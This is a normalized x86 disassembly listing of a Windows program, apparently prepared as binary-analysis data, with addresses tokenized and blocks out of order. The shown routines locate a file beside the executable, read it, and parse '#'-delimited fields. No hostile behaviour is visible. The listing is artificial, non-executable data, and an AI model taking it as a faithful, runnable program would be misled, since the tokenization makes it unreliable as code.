sub esp 0x518
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx rw-data
call sub_410f90
mov [ rw-data ] 0x0
lea ecx [ ebp - 0x411 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x444 ]
push ecx
lea ecx [ ebp - 0x411 ]
call sub_41c0e0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x444 ]
call sub_40be90
push eax
call [ PathRemoveFileSpecW@IAT ]
push r--data
lea ecx [ ebp - 0x444 ]
call sub_40be90
push eax
call [ PathAppendW@IAT ]
push 0x1
lea ecx [ ebp - 0x4fc ]
call sub_40e550
push 0x1
push 0x40
push 0x1
lea edx [ ebp - 0x444 ]
push edx
lea ecx [ ebp - 0x4fc ]
call sub_411090
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x410 ] 0x0
push 0x3ff
push 0x0
lea eax [ ebp - 0x40f ]
push eax
call sub_427900
add esp 0xc
push r--data
lea ecx [ ebp - 0x42c ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x4fc ]
call sub_411200
movzx ecx al
test ecx ecx
je r-xdata
mov ecx rw-data
call sub_411050
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x42c ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x4fc ]
call sub_40e520
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x444 ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x411 ]
call sub_40cb60
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4fc ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp + eax - 0x4fc ]
call sub_40dae0
movzx ecx al
test ecx ecx
jne r-xdata
mov ecx rw-data
call sub_410ff0
movzx eax al
test eax eax
jne r-xdata
lea ecx [ ebp - 0x4fc ]
call sub_411220
push 0x0
push 0x400
lea edx [ ebp - 0x410 ]
push edx
lea ecx [ ebp - 0x4fc ]
call sub_410720
lea eax [ ebp - 0x410 ]
push eax
lea ecx [ ebp - 0x524 ]
call sub_4017f0
mov [ ebp - 0x504 ] eax
mov ecx [ ebp - 0x504 ]
push ecx
lea ecx [ ebp - 0x42c ]
call sub_410070
lea ecx [ ebp - 0x524 ]
call sub_401830
lea ecx [ ebp - 0x42c ]
call sub_401890
cmp eax 0x1
jb r-xdata
jmp r-xdata
lea edx [ ebp - 0x50c ]
push edx
mov ecx rw-data
call sub_410f70
push eax
lea eax [ ebp - 0x42c ]
push eax
lea ecx [ ebp - 0x508 ]
push ecx
mov ecx rw-data
call sub_410fb0
mov ecx eax
call sub_411e00
movzx edx al
test edx edx
je r-xdata
lea eax [ ebp - 0x42c ]
push eax
mov ecx rw-data
call sub_410e70
mov [ eax ] 0x1
mov ecx [ rw-data ]
imul ecx ecx 0x18
add ecx rw-data
mov [ ebp - 0x500 ] ecx
mov edx [ rw-data ]
add edx 0x1
mov [ rw-data ] edx
lea eax [ ebp - 0x42c ]
push eax
mov ecx [ ebp - 0x500 ]
call sub_410150
sub_40e520
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x70
call sub_4111a0
mov ecx [ ebp - 0x4 ]
add ecx 0x70
call sub_410670
mov esp ebp
pop ebp
retn
sub_40e550
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e590
push 0x1
mov ecx [ ebp - 0x4 ]
add ecx 0x10
call sub_40e5c0
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x70
call sub_40df10
sub_40e590
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x18
call sub_40df10
sub_40e5c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40e600
mov eax [ ebp - 0x4 ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x3c ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40e600
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x20 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x34 ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_40e680
push ebp
mov ebp esp
push 0xffffffff
push sub_43b90b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx rw-data
call sub_410e70
mov [ eax ] 0x1
mov ecx [ rw-data ]
imul ecx ecx 0x18
add ecx rw-data
mov [ ebp - 0xdc ] ecx
mov edx [ rw-data ]
add edx 0x1
mov [ rw-data ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xdc ]
call sub_410150
lea ecx [ ebp - 0x11 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x11 ]
call sub_41c0e0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x2c ]
call sub_40be90
push eax
call [ PathRemoveFileSpecW@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
call sub_40be90
push eax
call [ PathAppendW@IAT ]
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_40e840
push 0x1
push 0x40
push 0x2
lea edx [ ebp - 0x2c ]
push edx
lea ecx [ ebp - 0xd4 ]
call sub_411e70
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xd4 ]
call sub_411fe0
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xd4 ]
call sub_40e810
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_40bdc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x11 ]
call sub_40cb60
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov [ ebp - 0xd8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0xd8 ]
cmp edx [ rw-data ]
jge r-xdata
lea ecx [ ebp - 0xd4 ]
call sub_412000
push sub_40ddc0
mov eax [ ebp - 0xd8 ]
imul eax eax 0x18
add eax rw-data
push eax
lea ecx [ ebp - 0xd4 ]
push ecx
call sub_416260
add esp 0x8
mov ecx eax
call sub_410450
jmp r-xdata
mov ecx [ ebp - 0xd8 ]
add ecx 0x1
mov [ ebp - 0xd8 ] ecx
sub_40e810
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x60
call sub_411f80
mov ecx [ ebp - 0x4 ]
add ecx 0x60
call sub_410670
mov esp ebp
pop ebp
retn
sub_40e840
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40dee0
push 0x1
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_40e5c0
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x60
call sub_40df10
sub_40e880
push ebp
mov ebp esp
push 0xffffffff
push sub_43b430
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x20 ] ecx
call sub_40e290
lea ecx [ ebp - 0x11 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x0
push rw-data
push rw-data
push rw-data
push rw-data
lea ecx [ ebp - 0x11 ]
call sub_41c680
push rw-data
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x11 ]
call sub_41d230
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x4 ] 0x1
push 0x0
mov edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x11 ]
call sub_41a9c0
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
push ecx
mov ecx rw-data
call sub_410070
lea ecx [ ebp - 0x44 ]
call sub_401830
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x5c ]
call sub_40bdc0
lea edx [ ebp - 0x74 ]
push edx
lea ecx [ ebp - 0x11 ]
call sub_41de70
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
call sub_410d50
lea ecx [ ebp - 0x74 ]
call sub_40bdc0
lea ecx [ ebp - 0x11 ]
call sub_41e620
movzx ecx al
test ecx ecx
je r-xdata
push r--data
mov ecx rw-data
call sub_40bde0
mov [ ebp - 0x1c ] eax
push r--data
mov ecx rw-data
call sub_40bde0
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x11 ]
call sub_40cb60
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_40e9c0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b698
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
call sub_410f70
push eax
lea ecx [ ebp + 0x24 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov ecx rw-data
call sub_410fb0
mov ecx eax
call sub_411e30
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40ea60
mov al [ ebp - 0xe ]
mov [ ebp - 0xd ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40ea60
mov al [ ebp - 0xd ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_40ea60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x1c
call sub_401830
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_401830
mov esp ebp
pop ebp
retn
sub_40ea90
push ebp
mov ebp esp
push 0xffffffff
push sub_43b664
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0xc2c ] 0x0
mov [ ebp - 0xc38 ] 0x0
mov [ ebp - 0xc3c ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov [ ebp - 0xc50 ] eax
push sub_401830
push sub_40ffa0
push 0x80
push 0x18
lea eax [ ebp - 0xc10 ]
push eax
call sub_423ed3
mov [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0xc28 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xc34 ] 0x0
jmp r-xdata
mov edx [ ebp - 0xc34 ]
cmp edx [ ebp - 0xc50 ]
jge r-xdata
mov [ ebp - 0xc30 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc34 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_410210
movsx ecx [ eax ]
cmp ecx 0x23
jne r-xdata
mov edx [ ebp - 0xc38 ]
sub edx 0x1
cmp [ ebp - 0xc30 ] edx
jge r-xdata
mov ecx [ ebp - 0xc34 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_410210
mov dl [ eax ]
movzx eax dl
push eax
lea ecx [ ebp - 0xc28 ]
call sub_4101f0
jmp r-xdata
mov edx [ ebp - 0xc3c ]
add edx 0x1
mov [ ebp - 0xc3c ] edx
cmp [ ebp - 0xc3c ] 0x1
je r-xdata
mov eax [ ebp - 0xc2c ]
mov [ ebp - 0xc48 ] eax
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xc28 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
push sub_401830
push 0x80
push 0x18
lea ecx [ ebp - 0xc10 ]
push ecx
call sub_423f3b
mov eax [ ebp - 0xc48 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
push 0x0
push r--data
mov eax [ ebp - 0xc30 ]
imul eax eax 0x18
lea ecx [ ebp + eax - 0xc10 ]
call sub_410230
cmp eax [ r--data ]
je r-xdata
mov ecx [ ebp - 0xc34 ]
add ecx 0x1
mov [ ebp - 0xc34 ] ecx
jmp r-xdata
mov eax [ ebp - 0xc38 ]
imul eax eax 0x18
lea ecx [ ebp + eax - 0xc10 ]
mov [ ebp - 0xc44 ] ecx
mov edx [ ebp - 0xc38 ]
add edx 0x1
mov [ ebp - 0xc38 ] edx
lea eax [ ebp - 0xc28 ]
push eax
mov ecx [ ebp - 0xc44 ]
call sub_410150
push r--data
lea ecx [ ebp - 0xc28 ]
call sub_401850
push 0x0
push r--data
mov edx [ ebp - 0xc30 ]
imul edx edx 0x18
lea ecx [ ebp + edx - 0xc10 ]
call sub_410230
cmp eax [ r--data ]
je r-xdata
mov ecx [ ebp - 0xc2c ]
imul ecx ecx 0x34
mov edx [ ebp + 0x8 ]
mov [ edx + ecx ] 0x1
mov eax [ ebp - 0xc30 ]
imul eax eax 0x18
lea ecx [ ebp + eax - 0xc10 ]
call sub_401890
sub eax 0x4
push eax
push 0x4
mov ecx [ ebp - 0xc30 ]
imul ecx ecx 0x18
lea edx [ ebp + ecx - 0xc10 ]
push edx
lea ecx [ ebp - 0xc6c ]
call sub_40ffd0
mov [ ebp - 0xc40 ] eax
mov eax [ ebp - 0xc40 ]
push eax
mov ecx [ ebp - 0xc2c ]
imul ecx ecx 0x34
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0x4 ]
call sub_410070
lea ecx [ ebp - 0xc6c ]
call sub_401830
mov eax [ ebp - 0xc30 ]
add eax 0x1
imul eax eax 0x18
lea ecx [ ebp + eax - 0xc10 ]
push ecx
mov edx [ ebp - 0xc2c ]
imul edx edx 0x34
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0x1c ]
call sub_410150
mov ecx [ ebp - 0xc2c ]
add ecx 0x1
mov [ ebp - 0xc2c ] ecx
jmp r-xdata
push 0x0
push r--data
mov ecx [ ebp - 0xc30 ]
imul ecx ecx 0x18
lea ecx [ ebp + ecx - 0xc10 ]
call sub_410230
cmp eax [ r--data ]
je r-xdata
mov eax [ ebp - 0xc2c ]
imul eax eax 0x34
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax ] 0x2
mov edx [ ebp - 0xc30 ]
imul edx edx 0x18
lea ecx [ ebp + edx - 0xc10 ]
call sub_401890
sub eax 0x5
push eax
push 0x5
mov eax [ ebp - 0xc30 ]
imul eax eax 0x18
lea ecx [ ebp + eax - 0xc10 ]
push ecx
lea ecx [ ebp - 0xc9c ]
call sub_40ffd0
mov [ ebp - 0xc4c ] eax
mov edx [ ebp - 0xc4c ]
push edx
mov eax [ ebp - 0xc2c ]
imul eax eax 0x34
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
call sub_410070
lea ecx [ ebp - 0xc9c ]
call sub_401830
mov edx [ ebp - 0xc30 ]
add edx 0x1
imul edx edx 0x18
lea eax [ ebp + edx - 0xc10 ]
push eax
mov ecx [ ebp - 0xc2c ]
imul ecx ecx 0x34
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx + 0x1c ]
call sub_410150
mov eax [ ebp - 0xc2c ]
add eax 0x1
mov [ ebp - 0xc2c ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0xc2c ]
imul edx edx 0x34
mov eax [ ebp + 0x8 ]
mov [ eax + edx ] 0x3
mov ecx [ ebp - 0xc30 ]
imul ecx ecx 0x18
lea ecx [ ebp + ecx - 0xc10 ]
call sub_401890
sub eax 0x5
push eax
push 0x5
mov edx [ ebp - 0xc30 ]
imul edx edx 0x18
lea eax [ ebp + edx - 0xc10 ]
push eax
lea ecx [ ebp - 0xc84 ]
call sub_40ffd0
mov [ ebp - 0xc54 ] eax
mov ecx [ ebp - 0xc54 ]
push ecx
mov edx [ ebp - 0xc2c ]
imul edx edx 0x34
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx + 0x4 ]
call sub_410070
lea ecx [ ebp - 0xc84 ]
call sub_401830
mov ecx [ ebp - 0xc30 ]
add ecx 0x1
imul ecx ecx 0x18
lea edx [ ebp + ecx - 0xc10 ]
push edx
mov eax [ ebp - 0xc2c ]
imul eax eax 0x34
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax + 0x1c ]
call sub_410150
mov edx [ ebp - 0xc2c ]
add edx 0x1
mov [ ebp - 0xc2c ] edx
mov ecx [ ebp - 0xc30 ]
add ecx 0x1
mov [ ebp - 0xc30 ] ecx
sub_40ef10
push ebp
mov ebp esp
sub esp 0x10
push esi
push 0x0
push r--data
mov ecx [ ebp + 0x8 ]
call sub_410230
cmp eax [ r--data ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_401890
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x1
push r--data
mov ecx [ ebp + 0xc ]
call sub_401850
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov al 0x1
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410210
movsx ecx [ eax ]
cmp ecx 0x57
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410210
movsx ecx [ eax ]
cmp ecx 0x23
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_410210
mov al [ eax ]
movzx ecx al
push ecx
mov ecx [ ebp + 0xc ]
call sub_4101f0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov esi [ edx ]
imul esi esi 0xa
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410210
movsx ecx [ eax ]
lea edx [ esi + ecx - 0x30 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
sub_40f020
push ebp
mov ebp esp
push 0xffffffff
push sub_43b7d5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x384
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0xd0 ] 0x0
lea ecx [ ebp - 0x11 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x12 ]
call sub_401a30
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xc8 ]
call sub_40f990
mov [ ebp - 0x4 ] 0x3
push r--data
lea ecx [ ebp - 0x60 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x4
push r--data
lea ecx [ ebp - 0x78 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x18 ] 0x621
mov [ ebp - 0xc9 ] 0x1
push r--data
lea ecx [ ebp - 0x168 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0xc9 ]
push eax
lea ecx [ ebp - 0x168 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
lea ecx [ ebp - 0x12 ]
call sub_4195e0
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x60 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
call sub_40ef10
add esp 0xc
movzx eax al
test eax eax
je r-xdata
push 0x0
push r--data
lea ecx [ ebp - 0x30 ]
call sub_410230
cmp eax [ r--data ]
jne r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_401850
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410020
mov ecx [ ebp - 0xd0 ]
or ecx 0x1
mov [ ebp - 0xd0 ] ecx
mov [ ebp - 0x4 ] 0x5
lea ecx [ ebp - 0x30 ]
call sub_401830
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x78 ]
call sub_401830
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x60 ]
call sub_401830
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xc8 ]
call sub_40f9c0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x12 ]
call sub_40cb60
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x11 ]
call sub_40cb60
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0xcb ] 0x1
push r--data
lea ecx [ ebp - 0x198 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0x9
lea ecx [ ebp - 0xcb ]
push ecx
lea edx [ ebp - 0x198 ]
push edx
lea eax [ ebp - 0x318 ]
push eax
lea ecx [ ebp - 0x12 ]
call sub_4195e0
mov [ ebp - 0xf8 ] eax
mov ecx [ ebp - 0xf8 ]
push ecx
lea ecx [ ebp - 0x30 ]
call sub_410070
lea ecx [ ebp - 0x318 ]
call sub_401830
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x198 ]
call sub_40bdc0
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
call sub_40ef10
add esp 0xc
movzx edx al
test edx edx
je r-xdata
push 0x0
push rw-data
lea edx [ ebp - 0x228 ]
push edx
lea ecx [ ebp - 0x11 ]
call sub_41a9c0
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x130 ]
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0x4 ] 0xc
push r--data
push rw-data
lea ecx [ ebp - 0x378 ]
push ecx
call sub_416570
add esp 0xc
mov [ ebp - 0xdc ] eax
mov edx [ ebp - 0xdc ]
mov [ ebp - 0xe8 ] edx
mov [ ebp - 0x4 ] 0xd
mov eax [ ebp - 0xe0 ]
push eax
mov ecx [ ebp - 0xe8 ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
call sub_416630
add esp 0xc
mov [ ebp - 0x4 ] 0xf
lea ecx [ ebp - 0x378 ]
call sub_401830
mov [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0x228 ]
call sub_401830
push r--data
lea ecx [ ebp - 0xa8 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x11
mov ecx rw-data
call sub_410ff0
movzx eax al
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
push 0x0
push r--data
lea ecx [ ebp - 0x30 ]
call sub_410230
cmp eax [ r--data ]
jne r-xdata
push r--data
lea ecx [ ebp - 0x78 ]
call sub_401850
jmp r-xdata
push r--data
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x288 ]
push edx
call sub_416570
add esp 0xc
mov [ ebp - 0xf4 ] eax
mov eax [ ebp - 0xf4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebp - 0xa8 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
lea eax [ ebp - 0x348 ]
push eax
call sub_4166e0
add esp 0xc
mov [ ebp - 0xe4 ] eax
mov ecx [ ebp - 0xe4 ]
mov [ ebp - 0x140 ] ecx
mov [ ebp - 0x4 ] 0x13
push r--data
mov edx [ ebp - 0x140 ]
push edx
lea eax [ ebp - 0x258 ]
push eax
call sub_416720
add esp 0xc
mov [ ebp - 0xec ] eax
mov ecx [ ebp - 0xec ]
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x4 ] 0x14
lea edx [ ebp - 0x78 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
lea ecx [ ebp - 0x2e8 ]
push ecx
call sub_4166e0
add esp 0xc
mov [ ebp - 0x150 ] eax
mov edx [ ebp - 0x150 ]
push edx
lea ecx [ ebp - 0x48 ]
call sub_410070
lea ecx [ ebp - 0x2e8 ]
call sub_401830
mov [ ebp - 0x4 ] 0x13
lea ecx [ ebp - 0x258 ]
call sub_401830
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebp - 0x348 ]
call sub_401830
mov [ ebp - 0x4 ] 0x11
lea ecx [ ebp - 0x288 ]
call sub_401830
push 0x0
push r--data
mov ecx rw-data
call sub_40beb0
cmp eax [ r--data ]
je r-xdata
mov ecx rw-data
call sub_411010
push eax
lea ecx [ ebp - 0xa8 ]
call sub_410150
mov [ ebp - 0xca ] 0x1
push r--data
lea ecx [ ebp - 0x1b0 ]
call sub_40bd80
mov [ ebp - 0x4 ] 0xa
lea eax [ ebp - 0xca ]
push eax
lea ecx [ ebp - 0x1b0 ]
push ecx
lea edx [ ebp - 0x390 ]
push edx
lea ecx [ ebp - 0x12 ]
call sub_4195e0
mov [ ebp - 0x120 ] eax
mov eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_410070
lea ecx [ ebp - 0x390 ]
call sub_401830
mov [ ebp - 0x4 ] 0x8
lea ecx [ ebp - 0x1b0 ]
call sub_40bdc0
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x60 ]
push edx
lea eax [ ebp - 0x30 ]
push eax
call sub_40ef10
add esp 0xc
movzx ecx al
test ecx ecx
je r-xdata
push 0x0
push rw-data
lea edx [ ebp - 0x210 ]
push edx
lea ecx [ ebp - 0x11 ]
call sub_41a9c0
mov [ ebp - 0xfc ] eax
mov eax [ ebp - 0xfc ]
mov [ ebp - 0x104 ] eax
mov [ ebp - 0x4 ] 0x15
push r--data
lea ecx [ ebp - 0x48 ]
push ecx
lea edx [ ebp - 0x1e0 ]
push edx
call sub_416570
add esp 0xc
mov [ ebp - 0x13c ] eax
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x12c ] eax
mov [ ebp - 0x4 ] 0x16
mov ecx [ ebp - 0x104 ]
push ecx
mov edx [ ebp - 0x12c ]
push edx
lea eax [ ebp - 0x2b8 ]
push eax
call sub_416630
add esp 0xc
mov [ ebp - 0x10c ] eax
mov ecx [ ebp - 0x10c ]
push ecx
lea ecx [ ebp - 0x48 ]
call sub_410070
lea ecx [ ebp - 0x2b8 ]
call sub_401830
mov [ ebp - 0x4 ] 0x15
lea ecx [ ebp - 0x1e0 ]
call sub_401830
mov [ ebp - 0x4 ] 0x11
lea ecx [ ebp - 0x210 ]
call sub_401830
push 0x0
push rw-data
lea edx [ ebp - 0x2a0 ]
push edx
